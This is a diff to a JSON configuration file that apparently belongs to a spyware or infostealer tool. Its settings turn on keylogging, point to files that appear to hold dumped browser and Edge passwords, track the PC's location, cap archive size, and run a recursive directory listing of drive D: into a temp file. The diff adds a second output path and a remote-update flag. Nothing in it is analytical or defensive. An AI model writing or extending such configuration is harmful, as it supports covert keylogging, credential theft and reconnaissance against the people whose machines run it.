@@ -7,6 +7,7 @@
   "_pasBrvFilePath": "c:\\temp\\bv_pr.txt",
   "_pasEdgFilePath": "c:\\temp\\eg_pr.txt",
   "logFilePath": "c:\\temp\\string.txt",
+  "certainFileFathDynamicRemoteUpdated": "c:\\Temp\\string2.txt",
   "tempFolderPrefix": "C:\\temp\\temp_",
   "maxArchiveSizeMB": 49,
   "licenseYear": 2026,
@@ -19,5 +20,6 @@
   "keyLog": true,
   "_pcCurrentLoc": true,
   "repeatCmdCommands": true,
+  "dynamicCertainFileFathDynamicRemoteUpdated": false,
   "cmdCommandsList": ["dir D:\\ /s /b >> \"C:\\Temp\\string2.txt\""]
 }
